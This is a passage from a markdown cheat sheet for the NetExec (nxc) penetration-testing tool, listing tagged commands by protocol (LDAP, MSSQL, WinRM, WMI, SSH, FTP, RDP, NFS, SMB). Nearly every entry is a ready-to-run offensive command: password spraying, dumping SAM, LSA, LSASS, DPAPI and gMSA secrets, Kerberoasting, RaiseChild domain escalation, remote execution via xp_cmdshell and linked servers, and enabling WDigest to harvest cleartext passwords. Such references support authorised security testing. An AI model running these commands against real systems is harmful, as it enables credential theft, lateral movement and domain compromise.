```bash
nxc ldap <ip> -u <user> -p '<password>' -M get-network -o ONLY_HOSTS=true
```

## nxc - extract all subnet information
Extract complete subnet and site information.

#platform/windows #target/remote #port/389 #port/636 #protocol/ldap #cat/RECON
```bash
nxc ldap <ip> -u <user> -p '<password>' -M get-network -o ALL=true
```

## nxc - get machine account quota
Check ms-DS-MachineAccountQuota value.

#platform/windows #target/remote #port/389 #port/636 #protocol/ldap #cat/RECON
```bash
nxc ldap <ip> -u <user> -p '<password>' -M maq
```

## nxc - enumerate admin count users
List users with adminCount=1 attribute.

#platform/windows #target/remote #port/389 #port/636 #protocol/ldap #cat/RECON
```bash
nxc ldap <ip> -u <user> -p '<password>' --admin-count
```

## nxc - query admin count with LDAP filter
Query AD using custom LDAP filter.

#platform/windows #target/remote #port/389 #port/636 #protocol/ldap #cat/RECON
```bash
nxc ldap <ip> -u <user> -p '<password>' --query "(adminCount=1)" "sAMAccountName"
```

## nxc - check LDAP signing
Check if LDAP signing is required.

#platform/windows #target/remote #port/389 #port/636 #protocol/ldap #cat/RECON
```bash
nxc ldap <ip> -u <user> -p '<password>' -M ldap-checker
```

### Delegation Issues

## nxc - find unconstrained delegation
Find accounts with unconstrained delegation.

#platform/windows #target/remote #port/389 #port/636 #protocol/ldap #cat/RECON
```bash
nxc ldap <ip> -u <user> -p '<password>' --trusted-for-delegation
```

## nxc - find misconfigured delegation
Find accounts with delegation misconfigurations.

#platform/windows #target/remote #port/389 #port/636 #protocol/ldap #cat/RECON
```bash
nxc ldap <ip> -u <user> -p '<password>' --find-delegation
```

### gMSA

## nxc - dump gMSA passwords
Extract Group Managed Service Account passwords.

#platform/windows #target/remote #port/389 #port/636 #protocol/ldap #cat/CREDENTIALS
```bash
nxc ldap <ip> -u <user> -p '<password>' --gmsa
```

## nxc - extract gMSA secrets by ID
Extract gMSA password using account ID.

#platform/windows #target/remote #port/389 #port/636 #protocol/ldap #cat/CREDENTIALS
```bash
nxc ldap <ip> -u <user> -p '<password>' --gmsa-convert-id <gmsa_id>
```

### LDAP Queries

## nxc - custom LDAP query all attributes
Run custom LDAP query returning all attributes.

#platform/windows #target/remote #port/389 #port/636 #protocol/ldap #cat/RECON
```bash
nxc ldap <ip> -u <user> -p '<password>' --query "<ldap_filter>" ""
```

## nxc - custom LDAP query specific attributes
Run custom LDAP query for specific attributes.

#platform/windows #target/remote #port/389 #port/636 #protocol/ldap #cat/RECON
```bash
nxc ldap <ip> -u <user> -p '<password>' --query "<ldap_filter>" "<attributes>"
```

### BloodHound

## nxc - run BloodHound collector all methods
Run BloodHound data collector (all methods).

#platform/windows #target/remote #port/389 #port/636 #protocol/ldap #cat/RECON
```bash
nxc ldap <ip> -u <user> -p '<password>' --bloodhound --collection All
```

## nxc - run BloodHound with specific methods
Run BloodHound collector with selected methods.

#platform/windows #target/remote #port/389 #port/636 #protocol/ldap #cat/RECON
```bash
nxc ldap <ip> -u <user> -p '<password>' --bloodhound --collection <methods>
```

### ADCS Exploitation

## nxc - enumerate ADCS
Enumerate Active Directory Certificate Services.

#platform/windows #target/remote #port/389 #port/636 #protocol/ldap #cat/RECON
```bash
nxc ldap <ip> -u <user> -p '<password>' -M adcs
```

## nxc - enumerate ADCS with server
Enumerate ADCS with specific server name.

#platform/windows #target/remote #port/389 #port/636 #protocol/ldap #cat/RECON
```bash
nxc ldap <ip> -u <user> -p '<password>' -M adcs -o SERVER=<server_name>
```

### DACL Rights

## nxc - read DACL rights for target
Read DACL permissions for target object.

#platform/windows #target/remote #port/389 #port/636 #protocol/ldap #cat/RECON
```bash
nxc ldap <ip> -k --kdcHost <dc> -M daclread -o TARGET=<target> ACTION=read
```

## nxc - read DACL rights with principal
Read DACL showing specific principal rights.

#platform/windows #target/remote #port/389 #port/636 #protocol/ldap #cat/RECON
```bash
nxc ldap <ip> -k --kdcHost <dc> -M daclread -o TARGET=<target> ACTION=read PRINCIPAL=<principal>
```

## nxc - read DACL for specific rights
Read DACL filtering by specific rights (DCSync, etc).

#platform/windows #target/remote #port/389 #port/636 #protocol/ldap #cat/RECON
```bash
nxc ldap <ip> -k --kdcHost <dc> -M daclread -o TARGET_DN=<dn> ACTION=read RIGHTS=<rights>
```

## nxc - read denied DACL entries
Read only denied ACE entries.

#platform/windows #target/remote #port/389 #port/636 #protocol/ldap #cat/RECON
```bash
nxc ldap <ip> -k --kdcHost <dc> -M daclread -o TARGET=<target> ACTION=read ACE_TYPE=denied
```

## nxc - backup DACL from file
Backup DACL for multiple targets from file.

#platform/windows #target/remote #port/389 #port/636 #protocol/ldap #cat/RECON
```bash
nxc ldap <ip> -k --kdcHost <dc> -M daclread -o TARGET=<targets_file> ACTION=backup
```

### Privilege Escalation

## nxc - RaiseChild attack
Perform domain privilege escalation via child domain.

#platform/windows #target/remote #port/389 #port/636 #protocol/ldap #cat/PRIVESC
```bash
nxc ldap <ip> -u <user> -p '<password>' -M raisechild
```

## nxc - RaiseChild with custom user
RaiseChild attack with custom username.

#platform/windows #target/remote #port/389 #port/636 #protocol/ldap #cat/PRIVESC
```bash
nxc ldap <ip> -u <user> -p '<password>' -M raisechild -o USER=<username> USER_ID=<uid>
```

## nxc - RaiseChild with encryption type
RaiseChild specifying Kerberos encryption type.

#platform/windows #target/remote #port/389 #port/636 #protocol/ldap #cat/PRIVESC
```bash
nxc ldap <ip> -u <user> -p '<password>' -M raisechild -o ETYPE=<encryption_type>
```

## nxc - RaiseChild with RID
RaiseChild with specific RID value.

#platform/windows #target/remote #port/389 #port/636 #protocol/ldap #cat/PRIVESC
```bash
nxc ldap <ip> -u <user> -p '<password>' -M raisechild -o RID=<rid>
```

## nxc - use Kerberos cache after RaiseChild
Use ticket from RaiseChild attack.

#platform/windows #target/remote #port/389 #port/636 #protocol/ldap #cat/PRIVESC
```bash
nxc ldap <ip> --use-kcache
```

### Entra ID / Azure AD

## nxc - enumerate Entra ID
Enumerate Azure AD / Entra ID information.

#platform/windows #target/remote #port/389 #port/636 #protocol/ldap #cat/RECON
```bash
nxc ldap <ip> -u <user> -p '<password>' -M entra-id
```

### SCCM

## nxc - enumerate SCCM via LDAP
Enumerate SCCM infrastructure via LDAP.

#platform/windows #target/remote #port/389 #port/636 #protocol/ldap #cat/RECON
```bash
nxc ldap <ip> -u <user> -p '<password>' -M sccm -o REC_RESOLVE=TRUE
```

### Password Settings Objects

## nxc - dump Fine-Grained Password Policies
Extract Password Settings Objects (PSO/FGPP).

#platform/windows #target/remote #port/389 #port/636 #protocol/ldap #cat/RECON
```bash
nxc ldap <ip> -u <user> -p '<password>' --pso
```



## MSSQL Protocol

### Authentication

## nxc - MSSQL Windows authentication
Authenticate to MSSQL using Windows credentials.

#platform/windows #target/remote #port/1433 #protocol/mssql #cat/AUTH
```bash
nxc mssql <ip> -u <user> -p '<password>'
```

## nxc - MSSQL Windows auth with domain
Authenticate to MSSQL specifying domain name.

#platform/windows #target/remote #port/1433 #protocol/mssql #cat/AUTH
```bash
nxc mssql <ip> -u <user> -p '<password>' -d <domain>
```

## nxc - MSSQL local authentication
Authenticate to MSSQL using local account.

#platform/windows #target/remote #port/1433 #protocol/mssql #cat/AUTH
```bash
nxc mssql <ip> -u <user> -p '<password>' --local-auth
```

## nxc - MSSQL with custom port
Connect to MSSQL on non-default port.

#platform/windows #target/remote #port/1433 #protocol/mssql #cat/AUTH
```bash
nxc mssql <ip> -u <user> -p '<password>' --port <port>
```

### Password Spraying

## nxc - MSSQL password spray
Password spray attack against MSSQL.

#platform/windows #target/remote #port/1433 #protocol/mssql #cat/BRUTEFORCE
```bash
nxc mssql <ip> -u <userfile> -p <passwordfile> --no-bruteforce
```

### Command Execution

## nxc - execute MSSQL query
Execute SQL query on MSSQL server.

#platform/windows #target/remote #port/1433 #protocol/mssql #cat/EXECUTION
```bash
nxc mssql <ip> -u <user> -p '<password>' --local-auth -q '<query>'
```

## nxc - execute Windows command via xp_cmdshell
Execute OS commands using xp_cmdshell.

#platform/windows #target/remote #port/1433 #protocol/mssql #cat/EXECUTION
```bash
nxc mssql <ip> -u <user> -p '<password>' --local-auth -x <command>
```

### File Operations

## nxc - upload file via MSSQL
Upload file to remote system via MSSQL.

#platform/windows #target/remote #port/1433 #protocol/mssql #cat/FILE
```bash
nxc mssql <ip> -u <user> -p '<password>' --put-file <local_file> <remote_file>
```

## nxc - download file via MSSQL
Download file from remote system via MSSQL.

#platform/windows #target/remote #port/1433 #protocol/mssql #cat/FILE
```bash
nxc mssql <ip> -u <user> -p '<password>' --get-file <remote_file> <local_file>
```

### Enumeration

## nxc - enumerate MSSQL users by RID bruteforce
Enumerate users by RID bruteforce via MSSQL.

#platform/windows #target/remote #port/1433 #protocol/mssql #cat/RECON
```bash
nxc mssql <ip> -u <user> -p '<password>' --rid-brute
```

### Linked Servers

## nxc - enumerate linked servers
List MSSQL linked servers.

#platform/windows #target/remote #port/1433 #protocol/mssql #cat/RECON
```bash
nxc mssql <ip> -u <user> -p '<password>' -M enum_links
```

## nxc - execute on linked server
Execute query on MSSQL linked server.

#platform/windows #target/remote #port/1433 #protocol/mssql #cat/EXECUTION
```bash
nxc mssql <ip> -u <user> -p '<password>' -M exec_on_link -o LINKED_SERVER=<server> COMMAND='<command>'
```

## nxc - enable xp_cmdshell on linked server
Enable xp_cmdshell on linked MSSQL server.

#platform/windows #target/remote #port/1433 #protocol/mssql #cat/EXECUTION
```bash
nxc mssql <ip> -u <user> -p '<password>' -M link_enable_cmdshell -o LINKED_SERVER=<server> ACTION=enable
```

## nxc - execute command on linked server
Execute OS command on linked server.

#platform/windows #target/remote #port/1433 #protocol/mssql #cat/EXECUTION
```bash
nxc mssql <ip> -u <user> -p '<password>' -M link_xpcmd -o LINKED_SERVER=<server> CMD='<command>'
```

## nxc - disable xp_cmdshell on linked server
Disable xp_cmdshell on linked server.

#platform/windows #target/remote #port/1433 #protocol/mssql #cat/EXECUTION
```bash
nxc mssql <ip> -u <user> -p '<password>' -M link_enable_cmdshell -o LINKED_SERVER=<server> ACTION=disable
```

### Privilege Escalation

## nxc - check MSSQL privileges
Check current MSSQL privilege level.

#platform/windows #target/remote #port/1433 #protocol/mssql #cat/RECON
```bash
nxc mssql <ip> -u <user> -p '<password>'
```

## nxc - enumerate MSSQL privilege escalation paths
Find privilege escalation paths in MSSQL.

#platform/windows #target/remote #port/1433 #protocol/mssql #cat/PRIVESC
```bash
nxc mssql <ip> -u <user> -p '<password>' -M mssql_priv
```

## nxc - perform MSSQL privilege escalation
Exploit MSSQL privilege escalation.

#platform/windows #target/remote #port/1433 #protocol/mssql #cat/PRIVESC
```bash
nxc mssql <ip> -u <user> -p '<password>' -M mssql_priv -o ACTION=privesc
```

## nxc - rollback MSSQL privilege escalation
Rollback MSSQL privilege escalation changes.

#platform/windows #target/remote #port/1433 #protocol/mssql #cat/PRIVESC
```bash
nxc mssql <ip> -u <user> -p '<password>' -M mssql_priv -o ACTION=rollback
```



## WinRM Protocol

### Authentication

## nxc - WinRM authentication
Authenticate to WinRM service.

#platform/windows #target/remote #port/5985 #port/5986 #protocol/winrm #cat/AUTH
```bash
nxc winrm <ip> -u <user> -p '<password>'
```

## nxc - WinRM auth with domain
Authenticate to WinRM with domain specification.

#platform/windows #target/remote #port/5985 #port/5986 #protocol/winrm #cat/AUTH
```bash
nxc winrm <ip> -u <user> -p '<password>' -d <domain>
```

### Password Spraying

## nxc - WinRM password spray
Password spray attack against WinRM.

#platform/windows #target/remote #port/5985 #port/5986 #protocol/winrm #cat/BRUTEFORCE
```bash
nxc winrm <ip> -u <userfile> -p <passwordfile> --no-bruteforce
```

### Command Execution

## nxc - execute PowerShell via WinRM
Execute PowerShell command via WinRM.

#platform/windows #target/remote #port/5985 #port/5986 #protocol/winrm #cat/EXECUTION
```bash
nxc winrm <ip> -u <user> -p '<password>' -X <command>
```

### Credential Dumping

## nxc - dump SAM via WinRM
Extract SAM hashes via WinRM.

#platform/windows #target/remote #port/5985 #port/5986 #protocol/winrm #cat/CREDENTIALS
```bash
nxc winrm <ip> -u <user> -p '<password>' --sam
```

## nxc - dump LSA via WinRM
Extract LSA secrets via WinRM.

#platform/windows #target/remote #port/5985 #port/5986 #protocol/winrm #cat/CREDENTIALS
```bash
nxc winrm <ip> -u <user> -p '<password>' --lsa
```

## nxc - dump DPAPI via WinRM
Extract DPAPI credentials via WinRM.

#platform/windows #target/remote #port/5985 #port/5986 #protocol/winrm #cat/CREDENTIALS
```bash
nxc winrm <ip> -u <user> -p '<password>' --dpapi
```

### LAPS

## nxc - read LAPS via WinRM
Retrieve LAPS password via WinRM.

#platform/windows #target/remote #port/5985 #port/5986 #protocol/winrm #cat/CREDENTIALS
```bash
nxc winrm <ip> -u <user> -p '<password>' --laps
```



## WMI Protocol

### Authentication

## nxc - WMI Windows authentication
Authenticate to WMI service.

#platform/windows #target/remote #port/135 #protocol/wmi #cat/AUTH
```bash
nxc wmi <ip> -u <user> -p '<password>'
```

## nxc - WMI auth with domain
Authenticate to WMI with domain.

#platform/windows #target/remote #port/135 #protocol/wmi #cat/AUTH
```bash
nxc wmi <ip> -u <user> -p '<password>' -d <domain>
```

## nxc - WMI local authentication
Authenticate to WMI using local account.

#platform/windows #target/remote #port/135 #protocol/wmi #cat/AUTH
```bash
nxc wmi <ip> -u <user> -p '<password>' --local-auth
```

### Password Spraying

## nxc - WMI password spray
Password spray attack against WMI.

#platform/windows #target/remote #port/135 #protocol/wmi #cat/BRUTEFORCE
```bash
nxc wmi <ip> -u <userfile> -p <passwordfile>
```

## nxc - WMI password spray without bruteforce
WMI password spray avoiding lockout.

#platform/windows #target/remote #port/135 #protocol/wmi #cat/BRUTEFORCE
```bash
nxc wmi <ip> -u <userfile> -p <passwordfile> --no-bruteforce
```

### Command Execution

## nxc - execute command via WMI
Execute command using WMI.

#platform/windows #target/remote #port/135 #protocol/wmi #cat/EXECUTION
```bash
nxc wmi <ip> -u <user> -p '<password>' -x <command>
```



## SSH Protocol

### Authentication

## nxc - SSH authentication
Authenticate to SSH service.

#platform/linux #target/remote #port/22 #protocol/ssh #cat/AUTH
```bash
nxc ssh <ip> -u <user> -p '<password>'
```

## nxc - SSH with custom port
Connect to SSH on non-standard port.

#platform/linux #target/remote #port/22 #protocol/ssh #cat/AUTH
```bash
nxc ssh <ip> --port <port> -u <user> -p '<password>'
```

### Password Spraying

## nxc - SSH password spray
Password spray attack against SSH.

#platform/linux #target/remote #port/22 #protocol/ssh #cat/BRUTEFORCE
```bash
nxc ssh <ip> -u <userfile> -p <passwordfile> --no-bruteforce
```

### Command Execution

## nxc - execute command via SSH
Execute command over SSH.

#platform/linux #target/remote #port/22 #protocol/ssh #cat/EXECUTION
```bash
nxc ssh <ip> -u <user> -p '<password>' -x <command>
```

### File Operations

## nxc - upload file via SSH
Upload file using SSH/SCP.

#platform/linux #target/remote #port/22 #protocol/ssh #cat/FILE
```bash
nxc ssh <ip> -u <user> -p '<password>' --put-file <local_file> <remote_file>
```

## nxc - download file via SSH
Download file using SSH/SCP.

#platform/linux #target/remote #port/22 #protocol/ssh #cat/FILE
```bash
nxc ssh <ip> -u <user> -p '<password>' --get-file <remote_file> <local_file>
```



## FTP Protocol

### Password Spraying

## nxc - FTP password spray
Password spray attack against FTP.

#platform/any #target/remote #port/21 #protocol/ftp #cat/BRUTEFORCE
```bash
nxc ftp <ip> -u <userfile> -p <passwordfile> --no-bruteforce
```

### File Operations

## nxc - list FTP directory
List FTP directory contents.

#platform/any #target/remote #port/21 #protocol/ftp #cat/RECON
```bash
nxc ftp <ip> -u <user> -p '<password>' --ls
```

## nxc - list specific FTP directory
List specific FTP directory path.

#platform/any #target/remote #port/21 #protocol/ftp #cat/RECON
```bash
nxc ftp <ip> -u <user> -p '<password>' --ls <directory>
```

## nxc - download file via FTP
Download file from FTP server.

#platform/any #target/remote #port/21 #protocol/ftp #cat/FILE
```bash
nxc ftp <ip> -u <user> -p '<password>' --get <filename>
```

## nxc - upload file via FTP
Upload file to FTP server.

#platform/any #target/remote #port/21 #protocol/ftp #cat/FILE
```bash
nxc ftp <ip> -u <user> -p '<password>' --put <local_file> <remote_file>
```



## RDP Protocol

### Password Spraying

## nxc - RDP password spray
Password spray attack against RDP.

#platform/windows #target/remote #port/3389 #protocol/rdp #cat/BRUTEFORCE
```bash
nxc rdp <ip> -u <user> -p '<password>'
```

## nxc - RDP password spray without bruteforce
RDP password spray avoiding lockout.

#platform/windows #target/remote #port/3389 #protocol/rdp #cat/BRUTEFORCE
```bash
nxc rdp <ip> -u <userfile> -p <passwordfile> --no-bruteforce
```

### Screenshots

## nxc - screenshot without NLA
Take screenshot of RDP login screen (no NLA).

#platform/windows #target/remote #port/3389 #protocol/rdp #cat/RECON
```bash
nxc rdp <ip> --nla-screenshot
```

## nxc - screenshot when connected
Take screenshot of active RDP session.

#platform/windows #target/remote #port/3389 #protocol/rdp #cat/RECON
```bash
nxc rdp <ip> -u <user> -p '<password>' --screenshot --screentime <seconds>
```

### Command Execution

## nxc - execute command via RDP (Beta)
Execute command via RDP (beta feature).

#platform/windows #target/remote #port/3389 #protocol/rdp #cat/EXECUTION
```bash
nxc rdp <ip> -u <user> -p '<password>' -x <command>
```

## nxc - execute via RDP with custom delays
Execute via RDP with timing adjustments.

#platform/windows #target/remote #port/3389 #protocol/rdp #cat/EXECUTION
```bash
nxc rdp <ip> -u <user> -p '<password>' -x <command> --cmd-delay <seconds> --clipboard-delay <seconds>
```



## NFS Protocol

### Enumeration

## nxc - enumerate NFS servers
Enumerate NFS service information.

#platform/linux #target/remote #port/2049 #protocol/nfs #cat/RECON
```bash
nxc nfs <ip>
```

## nxc - enumerate NFS shares
List NFS exported shares.

#platform/linux #target/remote #port/2049 #protocol/nfs #cat/RECON
```bash
nxc nfs <ip> --shares
```

## nxc - list files on NFS share
List files in NFS share.

#platform/linux #target/remote #port/2049 #protocol/nfs #cat/RECON
```bash
nxc nfs <ip> --share <share_path> --ls <directory>
```

## nxc - list files on root filesystem
List files in NFS root (if accessible).

#platform/linux #target/remote #port/2049 #protocol/nfs #cat/RECON
```bash
nxc nfs <ip> --ls /
```

## nxc - enumerate files recursively
Recursively enumerate NFS share contents.

#platform/linux #target/remote #port/2049 #protocol/nfs #cat/RECON
```bash
nxc nfs <ip> --enum-shares
```

## nxc - enumerate with custom depth
Enumerate NFS with custom recursion depth.

#platform/linux #target/remote #port/2049 #protocol/nfs #cat/RECON
```bash
nxc nfs <ip> --enum-shares <depth>
```

### File Operations

## nxc - download file with share specified
Download file from specific NFS share.

#platform/linux #target/remote #port/2049 #protocol/nfs #cat/FILE
```bash
nxc nfs <ip> --share <share_path> --get-file <remote_file> <local_file>
```

## nxc - download file without share
Download file using full NFS path.

#platform/linux #target/remote #port/2049 #protocol/nfs #cat/FILE
```bash
nxc nfs <ip> --get-file <remote_file> <local_file>
```

## nxc - upload file with share specified
Upload file to specific NFS share.

#platform/linux #target/remote #port/2049 #protocol/nfs #cat/FILE
```bash
nxc nfs <ip> --share <share_path> --put-file <local_file> <remote_file>
```

## nxc - upload file without share
Upload file using full NFS path.

#platform/linux #target/remote #port/2049 #protocol/nfs #cat/FILE
```bash
nxc nfs <ip> --put-file <local_file> <remote_file>
```



## General Options

### Target Formats

## nxc - target single hostname
Target a single host by hostname.

#platform/any #target/remote #protocol/any #cat/USAGE
```bash
nxc <protocol> <hostname>
```

## nxc - target single IP
Target a single host by IP address.

#platform/any #target/remote #protocol/any #cat/USAGE
```bash
nxc <protocol> <ip>
```

## nxc - target multiple IPs
Target multiple hosts by IP addresses.

#platform/any #target/remote #protocol/any #cat/USAGE
```bash
nxc <protocol> <ip1> <ip2> <ip3>
```

## nxc - target CIDR range
Target entire subnet using CIDR notation.

#platform/any #target/remote #protocol/any #cat/USAGE
```bash
nxc <protocol> <ip>/24
```

## nxc - target IP range
Target IP address range.

#platform/any #target/remote #protocol/any #cat/USAGE
```bash
nxc <protocol> <start_ip>-<end_ip>
```

## nxc - target from file
Target hosts from a file (one per line).

#platform/any #target/remote #protocol/any #cat/USAGE
```bash
nxc <protocol> <target_file>
```

### Credential Options

## nxc - use credential ID from database
Use stored credentials from NXC database.

#platform/any #target/remote #protocol/any #cat/AUTH
```bash
nxc <protocol> <ip> -id <cred_id>
```

## nxc - credentials with special characters
Use credentials containing special characters.

#platform/any #target/remote #protocol/any #cat/AUTH
```bash
nxc <protocol> <ip> -u <user> -p '<password>'
```

## nxc - credentials starting with dash
Use credentials that start with dash character.

#platform/any #target/remote #protocol/any #cat/AUTH
```bash
nxc <protocol> <ip> -u='-<username>' -p='-'<password>''
```

## nxc - continue on success
Continue testing after finding valid credentials.

#platform/any #target/remote #protocol/any #cat/AUTH
```bash
nxc <protocol> <ip> -u <userfile> -p <passwordfile> --continue-on-success
```

## nxc - no bruteforce mode
Pair credentials 1:1 to avoid lockout.

#platform/any #target/remote #protocol/any #cat/AUTH
```bash
nxc <protocol> <ip> -u <userfile> -p <passwordfile> --no-bruteforce
```

## nxc - jitter delay fixed
Add fixed delay between authentication attempts.

#platform/any #target/remote #protocol/any #cat/AUTH
```bash
nxc <protocol> <ip> --jitter <seconds> -u <userfile> -p <passwordfile>
```

## nxc - jitter delay range
Add random delay range between attempts.

#platform/any #target/remote #protocol/any #cat/AUTH
```bash
nxc <protocol> <ip> --jitter <min>-<max> -u <userfile> -p <passwordfile>
```

### Kerberos Options

## nxc - use Kerberos authentication
Authenticate using Kerberos protocol.

#platform/windows #target/remote #protocol/ldap #cat/KERBEROS
```bash
nxc ldap <hostname> -k --kdcHost <dc_hostname>
```

### Certificate Authentication

## nxc - authenticate with PFX certificate
Authenticate using PFX certificate file.

#platform/windows #target/remote #protocol/smb #cat/AUTH
```bash
nxc smb <ip> --pfx-cert <cert_file> -u <user>
```

## nxc - PFX with password
Use password-protected PFX certificate.

#platform/windows #target/remote #protocol/smb #cat/AUTH
```bash
nxc smb <ip> --pfx-cert <cert_file> --pfx-pass '<password>' -u <user>
```

## nxc - authenticate with base64 PFX
Use base64-encoded PFX certificate.

#platform/windows #target/remote #protocol/smb #cat/AUTH
```bash
nxc smb <ip> --pfx-base64 <base64_cert> -u <user>
```

## nxc - authenticate with PEM certificate
Authenticate using PEM certificate and key.

#platform/windows #target/remote #protocol/smb #cat/AUTH
```bash
nxc smb <ip> --pem-cert <cert_file> --pem-key <key_file> -u <user>
```

### DNS Options

## nxc - custom DNS server
Specify custom DNS server for resolution.

#platform/any #target/remote #protocol/any #cat/USAGE
```bash
nxc <protocol> <ip> -u <user> -p '<password>' --dns-server <dns_ip>
```

## nxc - DNS timeout
Set custom DNS query timeout.

#platform/any #target/remote #protocol/any #cat/USAGE
```bash
nxc <protocol> <ip> -u <user> -p '<password>' --dns-timeout <seconds>
```

## nxc - use TCP for DNS
Use TCP instead of UDP for DNS queries.

#platform/any #target/remote #protocol/any #cat/USAGE
```bash
nxc <protocol> <ip> -u <user> -p '<password>' --dns-tcp
```

## nxc - enforce IPv6
Force IPv6 connections.

#platform/any #target/remote #protocol/any #cat/USAGE
```bash
nxc <protocol> <ip> -u <user> -p '<password>' -6
```

### Module Usage

## nxc - list available modules
List all available NXC modules.

#platform/any #target/remote #protocol/any #cat/USAGE
```bash
nxc <protocol> -L
```

## nxc - use single module
Execute single module.

#platform/any #target/remote #protocol/any #cat/USAGE
```bash
nxc <protocol> <ip> -u <user> -p '<password>' -M <module_name>
```

## nxc - show module options
Show available options for module.

#platform/any #target/remote #protocol/any #cat/USAGE
```bash
nxc <protocol> -M <module_name> --options
```

## nxc - use module with options
Execute module with custom options.

#platform/any #target/remote #protocol/any #cat/USAGE
```bash
nxc <protocol> <ip> -u <user> -p '<password>' -M <module> -o <option>=<value>
```

## nxc - use multiple modules
Execute multiple modules in sequence.

#platform/any #target/remote #protocol/any #cat/USAGE
```bash
nxc <protocol> <ip> -u <user> -p '<password>' -M <module1> -M <module2> -M <module3>
```

### Logging

## nxc - log to file
Log all output to specified file.

#platform/any #target/remote #protocol/any #cat/USAGE
```bash
nxc <protocol> <ip> -u <user> -p '<password>' --log <logfile>
```



## Additional SMB Commands

## nxc - enumerate active sessions
List active user sessions on remote system.

#platform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/RECON
```bash
nxc smb <ip> -u <user> -p '<password>' --sessions
```

## nxc - enumerate local groups
List local security groups.

#platform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/RECON
```bash
nxc smb <ip> -u <user> -p '<password>' --local-groups
```

## nxc - enumerate domain groups via SMB
List domain groups via SMB protocol.

#platform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/RECON
```bash
nxc smb <ip> -u <user> -p '<password>' --groups
```

## nxc - enable WDigest
Enable WDigest to capture cleartext credentials.

#platform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/POSTEXPLOIT
```bash
nxc smb <ip> -u <user> -p '<password>' --local-auth --wdigest enable
```

## nxc - disable WDigest
Disable WDigest credential caching.

#platform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/POSTEXPLOIT
```bash
nxc smb <ip> -u <user> -p '<password>' --local-auth --wdigest disable
```

## nxc - query user sessions
Query active user sessions (quser).

#platform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/RECON
```bash
nxc smb <ip> -u <user> -p '<password>' -x 'quser'
```

## nxc - logoff user session
Force logoff user session by ID.

#platform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/POSTEXPLOIT
```bash
nxc smb <ip> -u <user> -p '<password>' -x 'logoff <session_id>' --no-output
```

## nxc - Kerberos authentication with password
Authenticate using Kerberos with password.

#platform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/ATTACK
```bash
nxc smb <hostname> -u <user> -p '<password>' -k
```

## nxc - Kerberos authentication with ticket cache
Use existing Kerberos ticket from cache.

#platform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/ATTACK
```bash
export KRB5CCNAME=<ticket.ccache>
nxc smb <hostname> --use-kcache
```

## nxc - Kerberos execute command with ticket
Execute command using cached Kerberos ticket.

#platform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/ATTACK
```bash
nxc smb <hostname> --use-kcache -x <command>
```

## nxc - password spray user equals password
Test if username equals password.

#platform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/ATTACK
```bash
nxc smb <ip> -u <userfile> -p <userfile> --no-bruteforce --continue-on-success
```

## nxc - password spray multiple attempts
Multiple password spray attempts.

#platform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/ATTACK
```bash
nxc smb <ip> -u <userfile> -p <passwordfile> --continue-on-success
```

## nxc - dump LSASS with BloodHound update
Dump LSASS and update BloodHound database.

#platform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/POSTEXPLOIT
```bash
nxc smb <ip> --local-auth -u <user> -H <hash> -M lsassy -o BLOODHOUND=True NEO4JUSER=<neo4j_user> NEO4JPASS=<neo4j_pass>
```

## nxc - DPAPI dump credentials
Extract DPAPI-protected credentials.

#platform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/CREDENTIALS
```bash
nxc smb <ip> -u <user> -p '<password>' --dpapi
```



## Additional LDAP Commands

## nxc - ASREPRoast without authentication
AS-REP roast without valid credentials.

#platform/linux #target/remote #port/389 #port/636 #protocol/ldap #cat/RECON
```bash
nxc ldap <ip> -u <user> -p '<password>' --asreproast <output_file> --kdcHost <dc_ip>
```

## nxc - Kerberoast with kdcHost
Kerberoast specifying KDC hostname.

#platform/linux #target/remote #port/389 #port/636 #protocol/ldap #cat/RECON
```bash
nxc ldap <ip> -u <user> -p '<password>' --kerberoasting <output_file> --kdcHost <dc_ip>
```

## nxc - enumerate unconstrained delegation
Find unconstrained delegation accounts.

#platform/linux #target/remote #port/389 #port/636 #protocol/ldap #cat/RECON
```bash
nxc ldap <ip> -u <user> -p '<password>' --trusted-for-delegation
```



## Additional MSSQL Commands

## nxc - MSSQL password spray no bruteforce
MSSQL password spray without bruteforce.

#platform/linux #target/remote #port/1433 #protocol/mssql #cat/ATTACK
```bash
nxc mssql <ip> -u <userfile> -p <passwordfile> --no-bruteforce
```



## Additional FTP Commands

## nxc - FTP list directory
List FTP directory.

#platform/any #target/remote #port/21 #protocol/ftp #cat/RECON
```bash
nxc ftp <ip> -u <user> -p '<password>' --ls
```

## nxc - FTP list and download file
List directory and download file.

#platform/any #target/remote #port/21 #protocol/ftp #cat/FILE
```bash
nxc ftp <ip> -u <user> -p '<password>' --ls <directory> --get <filename>
```



## Additional NFS Commands

## nxc - enumerate NFS servers
Enumerate NFS service information.

#platform/linux #target/remote #port/2049 #protocol/nfs #cat/RECON
```bash
nxc nfs <ip>
```

## nxc - enumerate NFS shares
List NFS exported shares.

#platform/linux #target/remote #port/2049 #protocol/nfs #cat/RECON
```bash
nxc nfs <ip> --shares
```

## nxc - list files on NFS share
List files in NFS share.

#platform/linux #target/remote #port/2049 #protocol/nfs #cat/RECON
```bash
nxc nfs <ip> --share '<share_path>' --ls '<directory>'
```

## nxc - enumerate NFS files recursively
Recursively list NFS share contents.

#platform/linux #target/remote #port/2049 #protocol/nfs #cat/RECON
```bash
nxc nfs <ip> --enum-shares
```